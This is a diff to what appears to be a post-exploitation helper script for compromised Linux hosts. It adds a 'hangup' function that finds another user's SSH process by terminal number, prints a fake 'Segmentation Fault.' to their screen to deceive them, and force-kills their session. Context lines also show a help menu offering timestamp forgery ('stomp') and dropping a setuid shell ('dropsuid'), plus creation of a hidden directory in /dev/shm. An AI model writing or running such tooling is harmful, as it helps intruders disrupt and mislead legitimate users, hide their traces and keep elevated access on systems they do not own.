@@ -328,6 +328,18 @@ getrel() {
 cat /etc/*release | grep PRETTY | awk -F "=" '{print $2}' | tr --delete '"'
 }
 
+hangup() {
+echo "This is seriously rude..."
+echo "Terminating PTS/$1"
+OWNER=$(stat -c '%U' /dev/pts/$1)
+SSH_PID=$(pgrep -a sshd | grep pts/$1 | cut -d ' ' -f 1)
+echo "Owner of PTS is $OWNER"
+echo "SSH PID is $SSH_PID"
+echo "Segmentation Fault." > /dev/pts/$1
+sleep 2
+kill -9 $SSH_PID
+}
+
 getenum() {
 echo "Doing some basic listing of the usual suspects..."
 echo -ne "Kernel: "
@@ -367,6 +379,7 @@ echo "[*] fpssh - pull ssh remote host fingerprints - fpssh [host]"
 echo "[*] stomp - alias for touch -r (needs arguments)"
 echo "[*] tools - check for common tools"
 echo "[*] dropsuid - drop tiny suid shell - dropsuid > [file]"
+echo "[*] hangup - terminate someones PTS by killing their SSH process. Very loud, DO NOT USE. - hangup [PTS NUMBER]"
 }
 
 mkdir /dev/shm/.q
